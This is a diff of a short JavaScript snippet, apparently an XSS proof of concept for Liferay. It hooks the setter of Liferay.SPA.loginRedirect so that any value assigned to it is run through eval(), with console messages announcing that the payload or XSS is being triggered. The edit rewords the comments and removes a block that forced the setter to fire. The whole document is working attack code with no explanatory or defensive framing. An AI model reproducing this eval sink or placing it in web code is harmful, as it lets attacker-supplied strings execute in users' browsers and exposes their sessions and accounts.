@@ -1,7 +1,7 @@
-// Define an auto-triggering setter on Liferay.SPA.loginRedirect
+// 1. Hook the loginRedirect setter to auto-eval anything set to it
 Object.defineProperty(Liferay.SPA, 'loginRedirect', {
   set: function(v) {
-    console.log('[+] Triggering XSS from loginRedirect setter...');
+    console.log("[+] Triggering payload via loginRedirect setter");
     eval(v);
   },
   get: function() {
@@ -9,9 +9,3 @@ Object.defineProperty(Liferay.SPA, 'loginRedirect', {
   },
   configurable: true
 });
-
-// Re-assign value to trigger the setter (if the value was set before this script ran, this won't work)
-if (Liferay.SPA.loginRedirect) {
-  const val = Liferay.SPA.loginRedirect;
-  Liferay.SPA.loginRedirect = val; // force setter to fire
-}
